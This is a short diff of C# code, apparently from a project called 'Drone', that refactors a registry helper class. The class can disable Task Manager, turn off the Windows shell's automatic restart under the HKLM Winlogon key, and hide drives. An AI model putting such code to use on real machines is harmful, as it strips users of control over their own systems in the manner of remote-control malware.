@@ -5,9 +5,9 @@ using System.Text;
 using System.Threading.Tasks;
 using Microsoft.Win32;
 
-namespace Drone
+namespace Drone.WinSystem
 {
-    static class RegistryManager
+    static class RegistryHandler
     {
         public static void SetTaskManager(bool enable)
         {
@@ -20,11 +20,11 @@ namespace Drone
             objRegistryKey.Close();
         }
 
-        public static void DisableWindowsShell()
+        public static void ToggleShellAutoRestart(bool toggle)
         {
             RegistryKey ourKey = Registry.LocalMachine;
             ourKey = ourKey.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true);
-            ourKey.SetValue("AutoRestartShell", 0);
+            ourKey.SetValue("AutoRestartShell", (toggle)? 1 : 0);
         }
         public static void HideDrive(string drive)
         {
